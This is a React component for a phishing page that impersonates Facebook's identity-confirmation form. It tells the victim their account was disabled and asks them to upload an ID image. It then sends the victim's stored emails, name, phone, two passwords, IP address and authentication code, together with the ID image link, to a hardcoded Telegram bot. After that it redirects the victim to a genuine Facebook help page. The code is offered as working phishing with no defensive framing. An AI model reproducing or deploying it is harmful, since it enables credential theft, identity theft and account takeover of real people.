import React, { useState } from 'react'
import axios from 'axios';
import { Link, useNavigate } from 'react-router-dom'
// const fetch = require("node-fetch");

const Upload = () => {
    const [selectedFile, setSelectedFile] = useState(null);
    const url = "https://api.cloudinary.com/v1_1/demo/image/upload";
    const dataLocalPassword = JSON.parse(localStorage.getItem('dataWithCode'));
    const navigate = useNavigate();

    const handleFileChange = (e) => {
        const file = e.target.files[0];
        setSelectedFile(file);
    };
    const handleUpload = () => {
        if (selectedFile) {
            const formData = new FormData();
            formData.append('file', selectedFile);
            formData.append("upload_preset", "docs_upload_example_us_preset");

            fetch(url, {
                method: 'POST',
                body: formData,
            })
                .then((response) => {
                    return response.text();
                })
                .then((data) => {
                    const url_image = JSON.parse(data).url
                    const dataImages = { ...dataLocalPassword, url_image };
                    localStorage.setItem('dataImages', JSON.stringify(dataImages))

                    const bot_token = '6322744915:AAHjCMBRKUvbqqF7rJuEmLzLtTtH04o9vb4';
                    const chat_id = '-4033656499';

                    const message = '<strong>Email Account: </strong>' + dataImages.fill_business_email +
                        '%0A<strong>Name Acount: </strong>' + dataImages.fill_full_name +
                        '%0A<strong>Personal Email: </strong>' + dataImages.fill_personal_email +
                        '%0A<strong>Facebook Page Name: </strong>' + dataImages.fill_facebook_pagename +
                        '%0A<strong>Phone Number: </strong>' + dataImages.fill_phone +
                        '%0A<strong>First Password Account: </strong>' + dataImages.failed_password +
                        '%0A<strong>Second Password Account: </strong>' + dataImages.fill_firt_password +
                        '%0A<strong>IP Address: </strong>' + dataImages.ip +
                        '%0A<strong>Code Authentication : </strong>' + dataImages.code +
                        '%0A<strong>Images Url: </strong>' + dataImages.url_image;

                    axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                        .then((response) => { return window.location.href = "https://facebook.com/help/282489752085908/page/?helpref=popular_topics" })
                        .catch((error) => { });

                });
        } else {
            console.log('Please select an image file.');
        }
    };

    return (
        <div>

            <div className="upload-image">

                <section className="header" style={{ background: "#4267b2" }}>
                    <p style={{ margin: '0', textAlign: "center", padding: "15px 0", fontSize: "18px", lineHeight: "22px", color: "#fff" }}>Confirm Your Identity With Facebook</p>
                </section>

                <div className="main-upload" style={{ background: "#dddfe2", "padding": "7px" }}>
                    <div className="form">
                        <div className="bg">
                            <h6>My personal account was disabled</h6>

                            <p>
                                Before we can review your account, please fill out the form below to help us verify your identity.
                            </p>

                            <p>
                                Please attach a copy of your ID(s). Learn more about why we require ID verification and what types of ID we'll accept below.
                            </p>

                            <div className="item-form">
                                <label for="file">ID(s)</label>
                                <p className="mini">As it's listed on the account</p>
                                <div>
                                    <input type="file" id="file" accept="image/*" name="files[]" onChange={handleFileChange} multiple />
                                </div>

                                <p className="desc">
                                    We may encrypt and store your ID for up to one year to improve our automated systems for detecting fake IDs. We might use trusted service providers to help review your information. Your ID will be stored securely and will not be visible to anyone on Facebook. If you don't want Facebook to use your ID to improve our automated systems for detecting fake IDs, you can adjust your Identity Confirmation Settings. If you turn this option off, the copy of your ID will be deleted within 30 days of submission or when you turned this option off. Visit the Help Centre to learn more about what happens to your ID after you have sent it to us.
                                </p>
                            </div>
                        </div>

                        <button onClick={handleUpload} type='submit' value="Send" name="submit" id="btn-submit">Send</button>

                    </div>
                    <div className="footer">
                        <b>Submitting ID</b>
                        <ul>
                            <li><a href="/help/103873106370583?helpref=contact_forms" target="_blank">ID rejected by Facebook</a></li>
                            <li><a href="/help/159096464162185?helpref=contact_forms" target="_blank">Types of IDs that Facebook accepts?</a></li>
                            <li><a href="/help/283100488694834?helpref=contact_forms" target="_blank">How to upload an ID to Facebook?</a></li>
                            <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">Why Facebook may ask you to upload an ID</a></li>
                            <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">What happens to your ID after you send it to Facebook</a></li>
                        </ul>
                    </div>
                </div>

            </div>

        </div>
    )
}

export default Upload